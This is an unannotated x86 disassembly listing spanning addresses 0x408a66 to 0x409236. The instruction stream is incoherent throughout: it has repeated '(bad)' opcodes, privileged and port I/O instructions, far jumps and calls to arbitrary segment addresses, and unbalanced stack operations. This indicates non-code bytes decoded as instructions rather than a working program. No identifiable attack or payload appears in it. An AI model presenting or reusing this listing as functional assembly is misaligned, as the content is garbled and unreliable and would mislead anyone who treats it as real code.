  408a66:	test   al,0x9
  408a68:	mov    edx,ds
  408a6a:	adc    bh,BYTE PTR [edi+0x7b3f2ec7]
  408a70:	xchg   ebp,eax
  408a71:	jge    0x408ae8
  408a73:	sbb    BYTE PTR [ebx-0x44],dh
  408a76:	adc    edx,DWORD PTR [ecx+0x2a]
  408a79:	jo     0x408aed
  408a7b:	pop    ss
  408a7c:	enter  0x2975,0x1
  408a80:	shl    ebx,cl
  408a82:	(bad)  
  408a83:	jecxz  0x408ae4
  408a85:	std    
  408a86:	jbe    0x408a9b
  408a88:	sahf   
  408a89:	cwde   
  408a8a:	fisubr WORD PTR [eax]
  408a8c:	pop    eax
  408a8d:	jge    0x408ab2
  408a8f:	repnz dec ebp
  408a91:	cmp    cl,BYTE PTR [edx-0x6b]
  408a94:	or     ecx,eax
  408a96:	and    eax,0xbabb1d45
  408a9b:	sub    ebp,DWORD PTR [ebx]
  408a9d:	into   
  408a9e:	mov    ?,WORD PTR [edi]
  408aa0:	mov    BYTE PTR [ecx],dh
  408aa2:	cmp    edi,DWORD PTR [ecx+eax*2]
  408aa5:	pop    edi
  408aa6:	call   0xac89:0x942033ff
  408aad:	dec    ebx
  408aae:	in     al,0x79
  408ab0:	icebp  
  408ab1:	aam    0xa8
  408ab3:	lds    ecx,FWORD PTR [eax]
  408ab5:	pop    ebx
  408ab6:	xchg   ebp,eax
  408ab7:	cmovl  esi,ebx
  408aba:	cli    
  408abb:	sub    dl,BYTE PTR [edx+0xe]
  408abe:	push   ebx
  408abf:	into   
  408ac0:	iret   
  408ac1:	ficom  DWORD PTR [ecx-0x1556d4a1]
  408ac7:	jmp    0x408a66
  408ac9:	test   BYTE PTR [edx+ebp*8+0x46],0xb4
  408ace:	and    ebx,DWORD PTR [esi-0x67509dcc]
  408ad4:	xchg   ebp,eax
  408ad5:	iret   
  408ad6:	xor    eax,0xcc7cac8b
  408adb:	inc    ecx
  408adc:	mov    al,0x5f
  408ade:	mov    esp,0x4e87fc80
  408ae3:	test   BYTE PTR [eax+0x4d57056f],0xdc
  408aea:	stos   BYTE PTR es:[edi],al
  408aeb:	mov    ch,0x9d
  408aed:	(bad)  
  408aee:	cmc    
  408aef:	push   0xfa5662b8
  408af4:	mov    esi,?
  408af6:	pop    ecx
  408af7:	imul   ebp,DWORD PTR [ebp-0xa],0xb
  408afb:	jno    0x408b50
  408afd:	popf   
  408afe:	sbb    al,BYTE PTR [ecx]
  408b00:	xchg   DWORD PTR [ebx-0x7811d1fa],ebx
  408b06:	dec    edx
  408b07:	add    eax,0xdc5266c5
  408b0c:	jmp    0xc2e01fc5
  408b11:	aaa    
  408b12:	adc    al,0x85
  408b14:	popf   
  408b15:	add    dh,ah
  408b17:	int3   
  408b18:	popa   
  408b19:	out    dx,al
  408b1a:	(bad)  
  408b1c:	adc    DWORD PTR [ecx-0x1ad5d93a],eax
  408b22:	pop    ebx
  408b23:	sub    BYTE PTR [ebx],cl
  408b25:	push   ds
  408b26:	or     ah,bh
  408b28:	sbb    al,0xe5
  408b2a:	xor    eax,0xdbe448a2
  408b2f:	aaa    
  408b30:	jmp    0x3202:0x8ab6930f
  408b37:	jnp    0x408b64
  408b39:	sbb    ebp,esi
  408b3b:	inc    eax
  408b3c:	imul   ebx,DWORD PTR [edx],0x0
  408b3f:	lods   eax,DWORD PTR ds:[esi]
  408b40:	inc    ecx
  408b41:	or     al,0xc
  408b43:	(bad)
  408b46:	jae    0x408b57
  408b48:	addr16 jo 0x408bac
  408b4b:	std    
  408b4c:	dec    eax
  408b4d:	test   al,0x11
  408b4f:	mov    ebp,0x76cbc3c3
  408b54:	popa   
  408b55:	mov    ah,0xa1
  408b57:	outs   dx,DWORD PTR ds:[esi]
  408b58:	ins    BYTE PTR es:[edi],dx
  408b59:	(bad)  
  408b5a:	js     0x408af0
  408b5c:	(bad)  
  408b5d:	out    dx,al
  408b5e:	mov    esp,edi
  408b60:	jle    0x408b33
  408b62:	or     al,0xa7
  408b64:	add    DWORD PTR [ebx-0xd],eax
  408b67:	inc    esp
  408b68:	pop    ds
  408b69:	pop    esp
  408b6a:	xor    al,0x44
  408b6c:	jmp    0xc72c77
  408b71:	xchg   DWORD PTR [eax],esi
  408b73:	rcr    ebp,1
  408b75:	and    DWORD PTR [edx],esp
  408b77:	nop
  408b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b79:	jl     0x408bb4
  408b7b:	sahf   
  408b7c:	pop    ecx
  408b7d:	pusha  
  408b7e:	sbb    al,0x97
  408b80:	out    0x9d,al
  408b82:	jne    0x408b32
  408b84:	int    0xb9
  408b86:	ins    BYTE PTR es:[edi],dx
  408b87:	arpl   WORD PTR [eax+ebx*1],cx
  408b8a:	gs ds icebp 
  408b8d:	add    BYTE PTR [ebp+0x6b36af7c],cl
  408b93:	je     0x408b1f
  408b95:	push   0x37f13e1f
  408b9a:	push   cs
  408b9b:	gs push 0x5d
  408b9e:	pop    esp
  408b9f:	and    dh,BYTE PTR [esp+edx*2]
  408ba2:	pop    edx
  408ba3:	or     bh,BYTE PTR [ebp+0x798a7324]
  408ba9:	cmp    ah,cl
  408bab:	arpl   WORD PTR [ecx+0x7680d8a3],cx
  408bb1:	out    0x80,eax
  408bb3:	jns    0x408b86
  408bb5:	jmp    0xa3c17d34
  408bba:	push   0xe450d535
  408bbf:	fabs   
  408bc1:	and    eax,0x6b1aac57
  408bc6:	mov    dh,0x79
  408bc8:	inc    eax
  408bc9:	loope  0x408bb1
  408bcb:	call   0x47abe040
  408bd0:	(bad)  [esi-0x74395280]
  408bd6:	xlat   BYTE PTR ds:[ebx]
  408bd7:	dec    BYTE PTR [ecx+0x5a]
  408bda:	fdivr  QWORD PTR [esi+eiz*8]
  408bdd:	push   0x3c6a15f3
  408be2:	sbb    DWORD PTR [eax+0x16],ebp
  408be5:	fistp  DWORD PTR [ebx+0x6e]
  408be8:	loopne 0x408c3c
  408bea:	lock inc eax
  408bec:	inc    ebx
  408bed:	adc    ebp,DWORD PTR [esp+edx*8]
  408bf0:	mov    dl,0x85
  408bf2:	mov    ebp,0xe7ec0bc2
  408bf7:	mov    bh,0xdb
  408bf9:	mov    dl,0xb8
  408bfb:	dec    esp
  408bfc:	shl    BYTE PTR [edx],0xc8
  408bff:	pop    ds
  408c00:	das    
  408c01:	push   ecx
  408c02:	not    BYTE PTR [edi]
  408c04:	xlat   BYTE PTR ds:[ebx]
  408c05:	jmp    0x6f94c018
  408c0a:	jo     0x408c1c
  408c0c:	sub    al,0x4e
  408c0e:	test   eax,0x8dc60f7f
  408c13:	jne    0x408c5e
  408c15:	in     al,dx
  408c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c17:	in     eax,dx
  408c18:	frstor [ebp+0x6f]
  408c1b:	or     al,0xac
  408c1d:	jl     0x408bd9
  408c1f:	jns    0x408bdf
  408c21:	stc    
  408c22:	or     esi,DWORD PTR [esi]
  408c24:	pop    es
  408c25:	mov    edx,0x410a70ac
  408c2a:	lods   al,BYTE PTR ds:[esi]
  408c2b:	mov    ah,0x6b
  408c2d:	mov    dh,0x2
  408c2f:	inc    eax
  408c30:	cdq    
  408c31:	lock test BYTE PTR [esi],ch
  408c34:	bound  eax,QWORD PTR [edx+0x56bb66dd]
  408c3a:	dec    ecx
  408c3b:	xchg   edx,eax
  408c3c:	aas    
  408c3d:	fadd   st,st(2)
  408c3f:	sbb    al,0xb1
  408c41:	ret    
  408c42:	dec    ebp
  408c43:	retf   0x9ff1
  408c46:	in     al,dx
  408c47:	iret   
  408c48:	and    dl,ch
  408c4a:	push   edi
  408c4b:	xor    bh,BYTE PTR [ecx]
  408c4d:	jge    0x408cac
  408c4f:	data16 xchg BYTE PTR [ecx],dh
  408c52:	pop    esp
  408c53:	rcl    BYTE PTR cs:[esi],cl
  408c56:	add    ebp,DWORD PTR [edx]
  408c58:	dec    edi
  408c59:	mov    eax,0x40d4e47c
  408c5e:	dec    ebx
  408c5f:	xor    DWORD PTR [eax+0x5f],0x28
  408c63:	neg    BYTE PTR [ebx+0x3a]
  408c66:	and    al,0x46
  408c68:	sbb    BYTE PTR [ebp+eiz*4-0x68c48a6],bl
  408c6f:	mov    ah,0x5c
  408c71:	cwde   
  408c72:	mov    cl,0xe2
  408c74:	lahf   
  408c75:	fdivr  st(4),st
  408c77:	mov    al,ds:0x463cd50e
  408c7c:	ins    DWORD PTR es:[edi],dx
  408c7d:	xchg   ebx,eax
  408c7e:	fs call 0x7725df68
  408c84:	fdivr  QWORD PTR ds:0x684973fa
  408c8a:	pop    eax
  408c8b:	icebp  
  408c8c:	jmp    0xd94a:0x897eea63
  408c93:	stc    
  408c94:	jl     0x408cb3
  408c96:	fs mov al,0x97
  408c99:	dec    esi
  408c9a:	dec    ecx
  408c9b:	lock (bad) 
  408c9d:	stc    
  408c9e:	pop    esp
  408c9f:	aad    0xd4
  408ca1:	rcl    DWORD PTR [ecx+0x30498e95],cl
  408ca7:	sub    ch,BYTE PTR [ecx]
  408ca9:	jne    0x408cd4
  408cab:	ror    DWORD PTR [ecx-0x70],0x56
  408caf:	sub    al,0x2b
  408cb1:	fidiv  DWORD PTR [ebp-0x203f4b06]
  408cb7:	dec    edx
  408cb8:	xchg   ebx,eax
  408cb9:	ret    0x56b5
  408cbc:	inc    edi
  408cbd:	mov    eax,0x9a16fd54
  408cc2:	pop    esp
  408cc3:	ins    BYTE PTR es:[edi],dx
  408cc4:	scas   eax,DWORD PTR es:[edi]
  408cc5:	push   edx
  408cc6:	push   esi
  408cc7:	or     al,bl
  408cc9:	adc    edi,DWORD PTR [eax+ecx*1-0x40]
  408ccd:	(bad)  
  408cce:	xchg   ebx,eax
  408ccf:	stc    
  408cd0:	inc    eax
  408cd1:	cmp    al,0x5c
  408cd3:	sbb    eax,0x9ca4f361
  408cd8:	sub    eax,0xe8125a
  408cdd:	lods   eax,DWORD PTR ds:[esi]
  408cde:	and    edx,DWORD PTR [ebx]
  408ce0:	jmp    0x469c:0xd4ea1636
  408ce7:	push   ss
  408ce8:	xchg   edx,eax
  408cea:	ficomp DWORD PTR [ebx+0x5535687b]
  408cf0:	mov    eax,ds:0x357d7771
  408cf5:	mov    al,ds:0x9006e75
  408cfa:	not    DWORD PTR [edx+edi*4-0x5c]
  408cfe:	xchg   DWORD PTR [ecx],eax
  408d00:	mov    WORD PTR [edi],es
  408d02:	mov    al,0x27
  408d04:	(bad)  
  408d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d06:	push   esi
  408d07:	or     DWORD PTR [ebx],eax
  408d09:	sub    eax,0x915f57df
  408d0e:	in     al,dx
  408d0f:	iret   
  408d10:	daa    
  408d11:	jno    0x408cb0
  408d13:	ja     0x408c9c
  408d15:	mov    edx,0xf44b0d84
  408d1a:	stos   BYTE PTR es:[edi],al
  408d1b:	cmp    edx,DWORD PTR [edi+0x18]
  408d1e:	js     0x408d18
  408d20:	sti    
  408d21:	push   ss
  408d22:	shl    DWORD PTR gs:[ebx+0x120acbe4],1
  408d29:	div    BYTE PTR [eax]
  408d2b:	cmp    DWORD PTR [edx+0x5c],ecx
  408d2e:	daa    
  408d2f:	pop    ss
  408d30:	dec    ecx
  408d31:	adc    al,0xf5
  408d33:	mov    eax,0x533f014e
  408d38:	je     0x408ce5
  408d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d3b:	inc    edx
  408d3c:	(bad)  
  408d3e:	pop    ds
  408d3f:	cdq    
  408d40:	jbe    0x408d95
  408d42:	dec    edi
  408d43:	into   
  408d44:	inc    esp
  408d45:	dec    esp
  408d46:	(bad)  
  408d48:	aad    0x6b
  408d4a:	lock sbb DWORD PTR ss:[ebx+0x5c],ebp
  408d4f:	out    dx,al
  408d50:	or     ebp,DWORD PTR [ecx-0x4e]
  408d53:	add    al,0x1f
  408d55:	xlat   BYTE PTR ds:[ebx]
  408d56:	dec    esi
  408d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d58:	push   eax
  408d59:	imul   ebp,DWORD PTR [edx+0x22364a21],0xbf113656
  408d63:	leave  
  408d64:	retf   
  408d65:	add    DWORD PTR [esi+ecx*2-0xd09b3e7],eax
  408d6c:	fnstenv [esi-0x13]
  408d6f:	ja     0x408daa
  408d71:	retf   
  408d72:	push   cs
  408d73:	adc    ah,BYTE PTR [ebp-0xe]
  408d76:	(bad)  [edi]
  408d78:	sbb    DWORD PTR [ecx+0x76],0x74
  408d7c:	push   ecx
  408d7d:	cmp    BYTE PTR [edx-0x2c4a9933],bl
  408d83:	inc    esp
  408d84:	mov    ebx,0x66c393fb
  408d89:	jo     0x408d3a
  408d8b:	imul   BYTE PTR [edx]
  408d8d:	shr    DWORD PTR [edi-0xa0a5718],cl
  408d93:	dec    edx
  408d94:	call   0xc2abc707
  408d99:	sub    dh,BYTE PTR [ecx]
  408d9b:	cmp    ebp,eax
  408d9d:	push   ss
  408d9e:	mov    bh,dh
  408da0:	pop    esi
  408da1:	stc    
  408da2:	dec    esi
  408da3:	jbe    0x408d36
  408da5:	lods   eax,DWORD PTR ds:[esi]
  408da6:	adc    eax,0x37e50852
  408dab:	jbe    0x408d8c
  408dad:	jbe    0x408d37
  408daf:	sbb    eax,0xc14c6be7
  408db4:	js     0x408d5c
  408db6:	call   0x648b:0x49e51a8
  408dbd:	lahf   
  408dbe:	sub    DWORD PTR [edx],0x9737cf22
  408dc4:	sub    eax,0x1824df08
  408dc9:	mov    cl,0xc3
  408dcb:	cwde   
  408dcc:	fstp   QWORD PTR [ecx-0x57179a0]
  408dd2:	push   eax
  408dd3:	ds mov ecx,0xc868ffeb
  408dd9:	adc    ecx,edi
  408ddb:	mov    eax,0xf963cd85
  408de0:	cwde   
  408de1:	adc    eax,0x56088316
  408de6:	jbe    0x408da0
  408de8:	and    eax,0xd1feed97
  408ded:	rol    DWORD PTR [esp+eiz*8],0x6e
  408df1:	inc    edi
  408df2:	pushw  0x864f
  408df6:	iret   
  408df7:	lds    ebx,FWORD PTR [ebp-0x53bf76a8]
  408dfd:	jmp    0x408da4
  408dff:	cmp    edi,DWORD PTR [eax+0x71f1bac6]
  408e05:	or     DWORD PTR [ecx-0x27],0x28
  408e09:	mov    esi,0x2f5c1089
  408e0e:	outs   dx,DWORD PTR ds:[esi]
  408e10:	adc    DWORD PTR [ebx-0x1e35b0cb],esp
  408e16:	repz push ebx
  408e18:	das    
  408e19:	cmp    ecx,esp
  408e1b:	les    ebp,FWORD PTR [ebp+0x5da5ceec]
  408e21:	ds xchg ebp,eax
  408e23:	jnp    0x408e62
  408e25:	pop    es
  408e26:	shl    BYTE PTR [ecx],0xb0
  408e29:	jl     0x408dba
  408e2b:	sub    eax,0x6714cf64
  408e30:	arpl   WORD PTR [ebp+0x2a],bp
  408e33:	jbe    0x408e2a
  408e35:	in     eax,0xff
  408e37:	adc    eax,0x7db82827
  408e3c:	cmc    
  408e3d:	mov    ebx,0x10848f2a
  408e42:	mov    al,ds:0xc0db0ced
  408e47:	adc    dh,BYTE PTR [edx-0xe]
  408e4a:	or     dh,BYTE PTR [esi+ecx*4+0x0]
  408e4e:	pop    ds
  408e4f:	test   al,0x7f
  408e51:	pop    ebx
  408e52:	jb     0x408e74
  408e54:	fistp  DWORD PTR [eax+0x345684ed]
  408e5a:	ja     0x408ed5
  408e5c:	and    edi,0xd6444137
  408e62:	mov    esp,0x7cdf796c
  408e67:	gs sahf 
  408e69:	mov    bl,dl
  408e6b:	pop    ebx
  408e6c:	add    esi,0xeaa0f3d7
  408e72:	enter  0x45e2,0xba
  408e76:	xor    dh,dl
  408e78:	repz dec edx
  408e7a:	xor    al,0x77
  408e7c:	sti    
  408e7d:	cmp    al,0x93
  408e7f:	ss sbb edx,edi
  408e82:	cmp    DWORD PTR [edx+0x7ad27a3f],eax
  408e88:	jo     0x408e36
  408e8a:	mov    DWORD PTR [edi],esp
  408e8c:	and    edx,DWORD PTR [ecx+esi*4+0x51]
  408e90:	xor    BYTE PTR [edx],ah
  408e92:	xlat   BYTE PTR ds:[ebx]
  408e93:	out    0xf5,eax
  408e95:	xor    al,0xfc
  408e97:	pop    ds
  408e98:	rol    al,cl
  408e9a:	sbb    esi,DWORD PTR [esi]
  408e9c:	outs   dx,DWORD PTR ds:[esi]
  408e9d:	pop    DWORD PTR [ebx+ecx*4]
  408ea0:	jmp    0x408ef6
  408ea2:	sti    
  408ea3:	xchg   DWORD PTR [eax],esp
  408ea5:	pusha  
  408ea6:	stos   DWORD PTR es:[edi],eax
  408ea7:	fwait
  408ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ea9:	pop    ecx
  408eaa:	dec    ebx
  408eab:	clc    
  408eac:	jno    0x408e4e
  408eae:	mov    eax,0x5a090180
  408eb3:	push   0xffffffb2
  408eb5:	mov    bl,BYTE PTR [eax-0x6a]
  408eb8:	pop    ds
  408eb9:	push   ebp
  408eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ebb:	shl    DWORD PTR [ecx-0x1a85ea6a],1
  408ec1:	bound  ecx,QWORD PTR ds:0x7629c375
  408ec7:	sbb    ecx,DWORD PTR [ecx+edx*8-0x7befd8a2]
  408ece:	rcr    cl,1
  408ed0:	lds    esi,FWORD PTR [eax+0x20]
  408ed3:	inc    esp
  408ed4:	mov    dh,0x8c
  408ed6:	arpl   WORD PTR [edi+0x35],cx
  408ed9:	sub    esp,DWORD PTR [edi-0x5b]
  408edc:	cmp    ch,BYTE PTR [edi-0x3d]
  408edf:	sbb    al,0x88
  408ee1:	js     0x408f48
  408ee3:	out    0x74,al
  408ee5:	int    0x1f
  408ee7:	dec    edi
  408ee8:	inc    ecx
  408ee9:	adc    BYTE PTR [edi+eiz*8],bl
  408eec:	hlt    
  408eed:	push   cs
  408eee:	sahf   
  408eef:	mov    ebp,0x80785a9c
  408ef4:	cli    
  408ef5:	sbb    BYTE PTR [ebx+eiz*1+0x20f5a1f4],bl
  408efc:	(bad)  [ebx-0x1c]
  408eff:	sbb    BYTE PTR [ebx+0x3fa79dc6],dh
  408f05:	xchg   DWORD PTR [ebx],esi
  408f07:	xchg   ecx,eax
  408f08:	and    al,dh
  408f0a:	or     eax,0xc597b34b
  408f0f:	fidiv  WORD PTR [ebx+0x72d5f68a]
  408f15:	dec    edi
  408f16:	or     eax,edx
  408f18:	in     eax,dx
  408f19:	inc    ebx
  408f1a:	fmul   QWORD PTR [edx+0x4]
  408f1d:	dec    edi
  408f1e:	inc    esp
  408f1f:	loop   0x408f7b
  408f21:	int3   
  408f22:	and    DWORD PTR [edi-0x30],0xffffffbe
  408f26:	cs leave 
  408f28:	adc    edi,DWORD PTR [esi+ebp*1+0x35b9f894]
  408f2f:	cmc    
  408f30:	gs jmp 0x4be15f2
  408f36:	sub    DWORD PTR [esi],edx
  408f38:	idiv   BYTE PTR [edi]
  408f3a:	cmc    
  408f3b:	(bad)  
  408f3c:	outs   dx,BYTE PTR ds:[esi]
  408f3d:	ins    DWORD PTR es:[edi],dx
  408f3e:	push   edi
  408f3f:	adc    eax,0x28a6b428
  408f44:	bound  eax,QWORD PTR [ecx+0x53]
  408f47:	popa   
  408f48:	mov    al,ds:0x84b80e49
  408f4d:	jns    0x408f4c
  408f4f:	pop    esp
  408f50:	fidivr DWORD PTR [ebx]
  408f52:	imul   ebx,eax,0x5c
  408f55:	fnstcw WORD PTR [edi-0x5d]
  408f58:	movq   mm4,QWORD PTR [ebx]
  408f5b:	iret   
  408f5c:	clc    
  408f5d:	push   esi
  408f5e:	xor    eax,0x134787c8
  408f63:	mov    ebp,0x9aaaa5a1
  408f68:	push   eax
  408f69:	leave  
  408f6a:	mov    edi,0xc7bb89a2
  408f6f:	out    0x98,eax
  408f71:	in     eax,0xbe
  408f73:	sbb    ebp,DWORD PTR [eax+0x6043d98c]
  408f79:	in     eax,dx
  408f7a:	jg     0x408f30
  408f7c:	out    dx,al
  408f7d:	pop    ss
  408f7e:	jg     0x408f0c
  408f80:	icebp  
  408f81:	loope  0x408f1c
  408f83:	dec    edi
  408f84:	dec    ecx
  408f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f86:	sar    DWORD PTR [ebp+esi*4+0x79],1
  408f8a:	test   DWORD PTR [eax-0x23],edi
  408f8d:	mov    edi,0xd45a087d
  408f92:	mov    dl,0x85
  408f94:	rcl    BYTE PTR ds:0x90c14ef0,1
  408f9a:	nop
  408f9b:	psadbw mm0,QWORD PTR [ecx-0x3c8179df]
  408fa2:	xchg   ecx,eax
  408fa3:	mov    ebp,0xcceb0bce
  408fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fa9:	lock jb 0x409005
  408fac:	sbb    esp,ebx
  408fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408faf:	retf   0x5528
  408fb2:	xor    dh,BYTE PTR [ebp-0x64535e3f]
  408fb8:	test   al,0xad
  408fba:	sub    al,BYTE PTR [edx+0x278fa0d4]
  408fc0:	gs pop eax
  408fc2:	mov    esi,0x29fe628e
  408fc7:	popf   
  408fc8:	jnp    0x408fa0
  408fca:	ds mov ch,0xed
  408fcd:	mov    edi,0x9f86e662
  408fd2:	mov    ds:0x7e8c540e,al
  408fd7:	adc    al,0xe4
  408fd9:	xor    al,BYTE PTR [esi-0x8c002a7]
  408fdf:	in     eax,0x3d
  408fe1:	test   eax,0xcc753438
  408fe6:	jmp    0x380e264f
  408feb:	stc    
  408fec:	inc    edx
  408fed:	adc    BYTE PTR ds:0xc08a8005,ah
  408ff3:	and    edi,DWORD PTR [ebx+0x2]
  408ff6:	fst    DWORD PTR [edx]
  408ff8:	cdq    
  408ff9:	adc    bl,BYTE PTR [ebp-0x41]
  408ffc:	cmp    DWORD PTR [ebp+0x61],ebp
  408fff:	mov    ss,WORD PTR [edx-0x7bc58b6a]
  409005:	aad    0x41
  409007:	push   edi
  409008:	and    BYTE PTR [eax],dh
  40900a:	retf   0xab80
  40900d:	push   edi
  40900e:	inc    eax
  40900f:	and    eax,0xe3a912bb
  409014:	sbb    eax,0xaecc94ca
  409019:	test   eax,0xfc06e87a
  40901e:	repnz sub esi,edi
  409021:	mov    dl,0x83
  409023:	in     al,0xc3
  409025:	xor    ah,BYTE PTR [edx+ebp*4]
  409028:	in     al,0xf9
  40902a:	arpl   WORD PTR [ebx],cx
  40902c:	cs pop edx
  40902e:	pop    es
  40902f:	push   esp
  409030:	rcr    BYTE PTR [esi-0x34de2c90],0xce
  409037:	jbe    0x409099
  409039:	outs   dx,BYTE PTR ds:[esi]
  40903a:	and    eax,0xccdf2351
  40903f:	jno    0x408ffd
  409041:	pop    ss
  409042:	sub    eax,0x839c72e8
  409047:	push   0x9a55bc4a
  40904c:	fmul   QWORD PTR [edx-0x79]
  40904f:	pop    es
  409050:	aaa    
  409051:	push   esp
  409052:	add    eax,0xe3f2c51e
  409057:	lods   eax,DWORD PTR ds:[esi]
  409058:	jno    0x4090ac
  40905a:	cmp    al,ch
  40905c:	(bad)  
  40905d:	jl     0x408feb
  40905f:	data16 (bad) 
  409061:	mov    BYTE PTR [edx],ch
  409063:	dec    esi
  409064:	adc    BYTE PTR [ebp-0x7d],bh
  409067:	xor    BYTE PTR [ecx+0x1ddf5a0d],cl
  40906d:	fistp  QWORD PTR [edx+0x337e4fd6]
  409073:	lods   eax,DWORD PTR ds:[esi]
  409074:	imul   ebp,DWORD PTR [ebx+0x711a4f96],0xffffff90
  40907b:	lods   eax,DWORD PTR ds:[esi]
  40907c:	dec    ecx
  40907d:	enter  0xd506,0x5c
  409081:	dec    edx
  409082:	and    edx,DWORD PTR [edi]
  409084:	in     eax,dx
  409085:	out    dx,al
  409086:	dec    esp
  409087:	adc    dh,BYTE PTR [ebp+0x3a]
  40908a:	(bad)  
  40908b:	int3   
  40908c:	fwait
  40908d:	retf   0xb37c
  409090:	jae    0x409102
  409092:	mov    al,ds:0x8cd0fcbc
  409097:	dec    ebx
  409098:	pop    ds
  409099:	xchg   ebx,eax
  40909a:	loop   0x409044
  40909c:	loop   0x409037
  40909e:	(bad)  
  40909f:	fbld   TBYTE PTR [ecx+ebp*2-0x78]
  4090a3:	mov    gs,WORD PTR [esi]
  4090a5:	int    0xa2
  4090a7:	mov    edx,0x652715bc
  4090ac:	and    eax,0x992b211
  4090b1:	add    DWORD PTR [edx+0x2f],0xd8fa7a3e
  4090b8:	hlt    
  4090b9:	loope  0x4090ea
  4090bb:	imul   ebx,DWORD PTR [esi],0x2eb5f1ba
  4090c1:	repnz adc ecx,ebp
  4090c4:	scas   al,BYTE PTR es:[edi]
  4090c5:	mov    DWORD PTR [eax-0x2d],0x2390cca5
  4090cc:	pop    ecx
  4090cd:	adc    bl,BYTE PTR [edi]
  4090cf:	test   DWORD PTR [edi-0x6a],0x3516386
  4090d6:	daa    
  4090d7:	or     BYTE PTR [edx-0x1722c7e5],dh
  4090dd:	dec    ebx
  4090de:	inc    esp
  4090df:	shl    DWORD PTR [edx],cl
  4090e1:	in     eax,0xd1
  4090e3:	pop    ecx
  4090e4:	(bad)  
  4090e5:	fistp  DWORD PTR [esi+0x7fbc4f74]
  4090eb:	sub    BYTE PTR [ebx],dh
  4090ed:	xchg   DWORD PTR [eax+0x68682d96],esi
  4090f3:	repnz push ebx
  4090f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090f6:	(bad)  
  4090f7:	pushf  
  4090f8:	jmp    0x594:0x99463323
  4090ff:	mov    eax,0xf2d2a19b
  409104:	push   0x966b4e89
  409109:	dec    edi
  40910a:	sbb    bh,BYTE PTR [ecx+0x69]
  40910d:	add    edx,DWORD PTR [eax]
  40910f:	inc    edi
  409110:	adc    ah,BYTE PTR [ebx+esi*2+0x7e4277c0]
  409117:	int    0xb6
  409119:	ins    DWORD PTR es:[edi],dx
  40911a:	cmp    ch,cl
  40911c:	gs jo  0x409134
  40911f:	add    ebp,DWORD PTR [esi-0x18]
  409122:	out    dx,al
  409123:	push   ebx
  409124:	xchg   edi,eax
  409125:	sub    BYTE PTR [eax],0x8a
  409128:	iret   
  409129:	push   ds
  40912a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40912b:	push   es
  40912c:	(bad)  
  40912e:	adc    BYTE PTR [esp+edi*1+0x92c23b4],dh
  409135:	xor    DWORD PTR [ebx],edi
  409137:	add    BYTE PTR [ebp+0x44],cl
  40913a:	call   0x2e45:0x9c440a27
  409141:	fidiv  DWORD PTR [edx+0x183296fd]
  409147:	test   eax,0xc92ad4b8
  40914c:	fcmovbe st,st(4)
  40914e:	adc    al,0xfe
  409150:	or     BYTE PTR [ebx-0x2c6046f0],al
  409156:	push   ecx
  409157:	dec    edx
  409158:	shl    DWORD PTR [esi+0x18],0x15
  40915c:	call   0x3fff4cd9
  409161:	or     BYTE PTR ds:0x7d34e124,bl
  409167:	pop    ebx
  409168:	stc    
  409169:	or     BYTE PTR [esi-0x57a71eed],ah
  40916f:	add    bl,ch
  409171:	mov    bh,0x38
  409173:	test   BYTE PTR [edx+0x56],0xc7
  409177:	pop    es
  409178:	xor    BYTE PTR [eax],0x2e
  40917b:	mov    cl,0x28
  40917d:	ret    0xfc9a
  409180:	sub    edi,DWORD PTR [eax]
  409182:	xor    esi,edi
  409184:	and    eax,0x41f14bce
  409189:	setle  BYTE PTR [ebp-0x69]
  40918d:	nop
  40918e:	popa   
  40918f:	xor    al,0x7b
  409191:	mov    al,0x9d
  409193:	inc    esp
  409194:	and    dh,BYTE PTR [edx-0x384bda85]
  40919a:	out    dx,eax
  40919b:	call   0x5fbe:0x8a9b5bc1
  4091a2:	jb     0x409222
  4091a4:	push   esi
  4091a5:	fwait
  4091a6:	cmp    al,0xd8
  4091a8:	pop    ds
  4091a9:	sub    al,0xb9
  4091ab:	neg    edi
  4091ad:	mov    bl,0x3b
  4091af:	pop    ebx
  4091b0:	stc    
  4091b1:	imul   ecx,DWORD PTR [edx-0x46389337],0xffffffc8
  4091b8:	mov    esp,?
  4091ba:	push   0xffffffbb
  4091bc:	jge    0x40913f
  4091be:	xor    eax,0xb72c3f5b
  4091c3:	and    BYTE PTR [edx],0x74
  4091c6:	inc    ebx
  4091c7:	cld    
  4091c8:	fidivr WORD PTR [ebx]
  4091ca:	call   0x85a6:0x771c57dc
  4091d1:	sub    DWORD PTR [edi+ecx*2],esi
  4091d4:	std    
  4091d5:	mov    edx,eax
  4091d7:	xor    al,0xa5
  4091d9:	loopne 0x409186
  4091db:	(bad)  
  4091dc:	pop    esi
  4091dd:	sbb    ebx,edx
  4091df:	mov    ds,WORD PTR [eax+0x7b05ae2e]
  4091e5:	je     0x409265
  4091e7:	jecxz  0x4091e2
  4091e9:	stc    
  4091ea:	(bad)  
  4091ec:	cdq    
  4091ed:	add    al,0x5f
  4091ef:	pop    eax
  4091f0:	jmp    0x409237
  4091f2:	leave  
  4091f3:	fwait
  4091f4:	mov    al,ds:0x9fe6d4e6
  4091f9:	pushf  
  4091fa:	inc    BYTE PTR [esi]
  4091fc:	add    cl,BYTE PTR ds:[eax]
  4091ff:	clc    
  409200:	sub    al,0xb8
  409202:	mov    dh,0x6f
  409204:	pop    di
  409206:	fcmove st,st(3)
  409208:	pop    ebx
  409209:	call   0x147f3522
  40920e:	test   BYTE PTR [ecx+0x65],bl
  409211:	pusha  
  409212:	xlat   BYTE PTR ds:[ebx]
  409213:	ret    
  409214:	pop    ecx
  409215:	daa    
  409216:	adc    eax,0x87f8787
  40921b:	loope  0x409221
  40921d:	repnz call 0xd38d:0x7f1f5d47
  409225:	jmp    0x2450:0x1e917832
  40922c:	test   BYTE PTR [esi+ecx*2+0x12],bl
  409230:	out    dx,eax
  409231:	jmp    0x40fc633f
  409236:	or     ch,bl
